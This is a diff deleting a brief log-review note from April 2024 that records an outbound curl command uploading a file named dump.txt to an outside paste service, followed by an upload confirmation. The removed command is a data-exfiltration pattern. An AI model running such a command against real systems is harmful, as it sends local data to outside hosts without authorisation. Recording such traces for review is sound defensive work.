@@ -1,7 +1,0 @@
-# Log review: April 2024
-
-Traces of outbound curl request identified:
-
-> curl -F "data=@dump.txt" https://tmpbin.net/a1b2c3-timedrop
-
-Upload complete. Ref archived by user: trace_dropper
